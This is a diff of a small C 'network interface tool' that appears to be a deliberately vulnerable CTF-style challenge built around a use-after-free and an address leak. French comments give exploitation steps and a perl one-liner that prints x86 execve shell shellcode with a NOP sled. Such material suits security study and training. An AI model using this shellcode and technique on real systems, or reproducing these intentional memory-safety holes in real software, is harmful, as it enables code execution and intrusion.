@@ -8,7 +8,7 @@
 #include <netinet/in.h>
 #include <net/if.h>
 #include <arpa/inet.h>
-//gcc -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -o uaf uaf.c
+//gcc -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -o uaf code.c
 /* but: écrire le shellcode dans le name interface+ free it+ new interface avec name =65 caractères (shellcode[60]+@)//allocate(malloc) physical connexion with name=0x pointing to begin @ of info #ASLR leak,
 +call turnOn sur la 1ere interface => exec shellcode
 */
@@ -20,9 +20,26 @@ struct physical{
    char info[58];
    char name[8];
 };*/
-typedef struct interface
+/* 1st run:
+ 1 (create->save 1)
+ (5 (show) =>name: eth0 ip: 192 turnOn: 0x7fffebaeb2c8)->alloue la struct dans celui-ci
+ 1 (create->save 2)
+ 5 (show) => name: eth2 ip: 193 turnOn: 0x7fffebaeb348
+ 4 (destroy "2nde")
+ 0 (select-> 1)
+ 4 (destroy "1er")
+ 1 (create -> sera stocke dans 1 ou 2: name: size 60 shellcode+@leak dans show (1/2 chance) (stocke dans l'autre))
+ //20 shellcode+ 12 NOP +4@ (8*4)=64
+ Shell:`perl -e 'print "\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" . "\x90" x 12 . "\xC8\xB2\xAE\xEB\xFF\x7F" x 4 '`
+ 5 (show -> on c'est si on est chanceux ou pas)
+ 0 (select 1)
+ 3 (turn on)
+ */
+ #define NAME_SIZE 48
+ //64 sinon
+typedef struct  __attribute__((__packed__))interface
 {
-    char name[59];
+    char name[NAME_SIZE];
     char *ip; //taille variable selon v4 or v6
     void (*turnOn)(struct interface*);
 } Interface;
@@ -35,7 +52,7 @@ void endOfLine(char* line);
 Interface* newInterface(char* name,char *ip, void (*on)(struct interface*))
 {
     Interface* inter = malloc(sizeof(Interface));
-    strncpy(inter->name, name, 59);
+    strncpy(inter->name, name, NAME_SIZE);
     inter->ip=strndup(ip, strlen(ip));
     inter->turnOn=on;
     return inter;
@@ -43,7 +60,7 @@ Interface* newInterface(char* name,char *ip, void (*on)(struct interface*))
 //leakage position last champ de la structure #mauvais %p avec & en trop => on peut retrouver le debut de buffer en faisant -60
 void showInterface(Interface *i)
 {
-    printf("name: %s \n ip: %s turnOn: %p",i->name,i->ip, &i->turnOn);
+    printf("\n name: %s ip: %s turnOn: %p \n",i->name,i->ip, &i->turnOn);
 }
 void endOfLine(char* line)
 {
@@ -102,6 +119,7 @@ void reset(Interface* inter)
 }
 int main()
 {
+	//printf("Sizeof interface : %d", sizeof(Interface));
     printf("\n This my cool interfaceTool,I am still working on it ! \n \
 The purpose of this is to speed up my network configuration.");
     int end = 0;
@@ -126,7 +144,8 @@ The purpose of this is to speed up my network configuration.");
         nl = getc(stdin);
         if(nl != '\n')
         {
-            exit(0);
+            puts("Bad selection, aborting \n");
+            goto EXIT;
         }
         fseek(stdin,0,SEEK_END);
         switch(order)
@@ -137,7 +156,7 @@ The purpose of this is to speed up my network configuration.");
             if(getc(stdin) != '\n')
             {
                  puts("Too long, aborting.");
-                exit(0);
+                goto EXIT;
             }
             //(int) strtol(str, (char **)NULL, 10)
             int nb=(int)turn;
@@ -145,7 +164,7 @@ The purpose of this is to speed up my network configuration.");
             if(nb >57 || nb <48)
             {
                 puts("\nBad number of interface, aborting.");
-                exit(0);
+                goto EXIT;
             }
             else if(inters[nb-48]!=NULL)
             {
@@ -172,32 +191,26 @@ The purpose of this is to speed up my network configuration.");
             if(getc(stdin) != '\n')
             {
                 puts("Bad number, aborting.");
-                exit(0);
+                goto EXIT;
             }
             puts("Select a free interface to save it:(0-9) \n");
             char t2=getc(stdin);
             if(getc(stdin) != '\n')
             {
                  puts("Too long, aborting.");
-                exit(0);
+                goto EXIT;
             }
             //(int) strtol(str, (char **)NULL, 10)
-            int nb=(int)t2;
+            int nbs=(int)t2;
             //printf("nb: %d", nb);
-            if(nb >57 || nb <48)
+            if(nbs >57 || nbs <48)
             {
                 puts("\nBad number of interface, aborting.");
-                exit(0);
-            }
-            if (inters[nb-48]!=NULL){
-                inters[nb-48]=inter;
-            }
-            else{
-                    ///TODO: goto aborting to free goodly all the memory (à la place des exit(0));
-                    free(inter->name);
-                    free(inter);
+                goto EXIT;
             }
             inter=newInterface(name,ip, (t=='1'?turn_on_old_school:turn_on_modern_school));
+            inters[nbs-48]=inter;
+            //double free si free là
             break;
         case '2':
             if(!inter)
@@ -235,5 +248,7 @@ The purpose of this is to speed up my network configuration.");
             end = 1;
         }
     }
+    EXIT:
+    puts("Nb:todo remove space allocated at exit");
     return 0;
 }
